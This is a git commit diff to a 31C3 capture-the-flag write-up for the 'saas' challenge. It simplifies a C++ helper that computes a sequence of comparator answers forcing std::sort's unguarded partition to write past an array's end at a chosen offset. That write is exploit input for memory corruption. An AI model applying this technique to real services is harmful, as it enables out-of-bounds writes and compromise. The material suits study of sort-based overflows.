55391c4c0758891ce9af95d03d6e3f4897985bea
Niklas Baumstark <niklas.baumstark@gmail.com>
2015-01-09 18:57:26 +0100

    simplify saas writeup

--- 31c3-ctf/saas/compute_answers.cpp
+++ 31c3-ctf/saas/compute_answers.cpp
@@ -1,12 +1,10 @@
 #include <bits/stdc++.h>
-#include "mysort.h"
 using namespace std;
 
 int main(int argc, char **argv) {
   // array has length n, we want to overwrite a value at offset "offset"
   // (can be >= n, which results in an overflow)
-  int n = atoi(argv[1]);
-  int offset = atoi(argv[2]);
+  int n = atoi(argv[1]), offset = atoi(argv[2]);
 
   vector<uint32_t> x;
   x.resize(2*n);
@@ -17,17 +15,18 @@ int main(int argc, char **argv) {
 
   vector<int> answers, answers2;
 
-  // this sequence forces unguarded_partition to return offset + 1
+  // these two answers are for __move_median_to_first
+  answers.push_back(1);
+  answers.push_back(1);
+  // this sequence forces __unguarded_partition to return offset + 1
   // then the whole range [0, offset] gets sorted normally
-  answers.push_back(1);
-  answers.push_back(1);
   for (int i = 0; i < offset; ++i)
     answers.push_back(1);
   answers.push_back(0);
   answers.push_back(0);
 
   int i = 0;
-  _sort(begin(x), begin(x) + n, [&](int a, int b) {
+  sort(begin(x), begin(x) + n, [&](int a, int b) {
     if (i < (int)answers.size())
       return (bool)answers[i++];
     else {
@@ -38,6 +37,11 @@ int main(int argc, char **argv) {
 
   // did the swap work?
   assert(x[0] == 0 && (int)x[offset] == offset);
+
+  // are the elements after the buffer still intact?
+  for (int i = n; i < 2*n; ++i)
+    if (i != offset)
+      assert((int)x[i] == i);
 
   // print sequence of answers
   cout << "{";
